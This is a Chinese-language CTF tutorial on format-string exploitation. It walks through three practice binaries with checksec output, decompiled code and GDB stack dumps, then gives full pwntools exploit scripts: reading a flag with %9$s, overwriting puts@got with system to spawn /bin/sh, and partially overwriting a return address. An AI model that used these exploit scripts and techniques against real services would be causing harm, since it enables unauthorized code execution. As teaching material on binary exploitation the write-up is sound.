# 格式化字符串漏洞例子

下面会介绍一些CTF中的格式化漏洞的题目。也都是格式化字符串常见的利用。

# 64位程序格式化字符串漏洞

## 原理

其实64位的偏移计算和32位类似，都是算对应的参数。只不过64位函数的前6个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。

## 例子

这里，我们以2017年的UIUCTF中pwn200 GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。

### 确定保护

```shell
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序开启了NX保护以及部分RELRO保护。

### 分析程序

可以发现，程序的漏洞很明显

```C
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```

### 确定偏移

我们在printf处下偏移如下,这里只关注代码部分与栈部分。

```shell
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: 没有那个文件或目录.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────


```

可以看到flag对应的栈上的偏移为5，除去对应的第一行为返回地址外，其偏移为4。此外，由于这是一个64位程序，所以前6个参数存在在对应的寄存器中，fmt字符串存储在RDI寄存器中，所以fmt字符串对应的地址的偏移为10。而fmt字符串中%order$s对应的order为fmt字符串后面的参数的顺序，所以我们只需要输入%9\$s即可得到flag的内容。当然，我们还有更简单的方法利用https://github.com/scwuaptx/Pwngdb中的fmtarg来判断某个参数的偏移。

```shell
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

需要注意的是我们必须break在printf处。

### 利用程序

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
#gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

# hijack GOT

## 原理

在目前的C程序中，libc中的函数都是通过GOT表来跳转的。此外，在 没有开启RELRO保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此，我们可以修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。比如说我们可以修改printf的got表项内容为system函数的地址。从而，程序在执行printf的时候实际执行的是system函数。

假设我们将函数A的地址覆盖为函数B的地址，那么这一攻击技巧可以分为以下步骤

- 确定函数A的GOT表地址。

  - 这一步我们利用的函数A一般在程序中已有，所以可以采用简单的寻找地址的方法来找。

- 确定函数B的内存地址

  - 这一步通常来说，需要我们自己想办法来泄露对应函数B的地址。

- 将函数B的内存地址写入到函数A的GOT表地址处。

  - 这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种

    - 写入函数：write函数。
    - ROP

    ```text
    pop eax; ret; 			# printf@got -> eax
    pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
    add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
    ```

    - 格式化字符串任意地址写

## 例子

这里我们以2016 CCTF中的pwn3为例进行介绍。

### 确定保护

如下

```shell
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序主要开启了NX保护。我们一般默认远程都是开启ASLR保护的。

### 分析程序

首先分析程序，可以发现程序似乎主要实现了一个需密码登录的ftp，具有get，put，dir三个基本功能。大概浏览一下每个功能的代码，发现在get功能中存在格式化字符串漏洞

```C
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

### 漏洞利用思路

既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路

- 绕过密码
- 确定格式化字符串参数偏移
- 利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。
- 修改puts@got的内容为system的地址。
- 执行system(“/bin/sh”)。

### 漏洞利用程序

如下

```python
from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


# password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


#password
password()
# get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

# get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

# modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
#gdb.attach(sh)
sh.sendline('/bin/sh;')

# system('/bin/sh')
show_dir()
sh.interactive()
```

请注意

- 我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。
- 这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got: system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。

# hijack retaddr

## 原理

很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。

## 例子

这里我们以三个白帽-pwnme_k0为例进行分析。

### 确定保护

```shell
➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序主要开启了NX保护以及Full RELRO保护。这我们就没有办法修改程序的got表了。

### 分析程序

简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞

```C
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}
```

其输出的内容为&a4+4。我们回溯一下，发现我们读入的passwrod内容也是

```C
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

当然我们还可以发现我们读入的username在距离的password20个字节。

```C
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```

好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。

### 利用思路

我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。

虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下

- 确定偏移
- 获取函数的rbp与返回地址
- 根据相对偏移获取存储返回地址的地址
- 将执行system函数调用的地址写入到存储返回地址的地址。

### 确定偏移

首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&a4 + 4)函数处

```text
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...
```

此时栈的情况为

```text
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。

### 修改地址

我们再仔细观察下断点处栈的信息

```text
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。

与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。

0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。

### 利用程序

这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。

```python
from pwn import *
from LibcSearcher import *
pwnme = ELF('./pwnme_k0')
if args['REMOTE']:
    sh = remote(11, 11)
else:
    sh = process('./pwnme_k0')
sh.recvuntil(':\n')
sh.sendline('a' * 8)
sh.recvuntil(':\n')
sh.sendline('%p' * 9)
sh.recvuntil('>')
sh.sendline('1')
sh.recvuntil('a' * 8 + '\n')
data = sh.recvuntil('1.', drop=True).split('0x')
print data
data = data[1:]
rbp = int(data[5], 16)
ret_addr = rbp - 0x38
sh.recvuntil('>')
sh.sendline('2')
sh.recvuntil(':\n')
sh.sendline(p64(ret_addr))
sh.recvuntil(':\n')
payload = '%2214d%8$hn'
sh.sendline(payload)
sh.recvuntil('>')
sh.sendline('1')
sh.interactive()
```

# 堆上的格式化字符串漏洞

待补充。

# 格式化字符串盲打

待补充。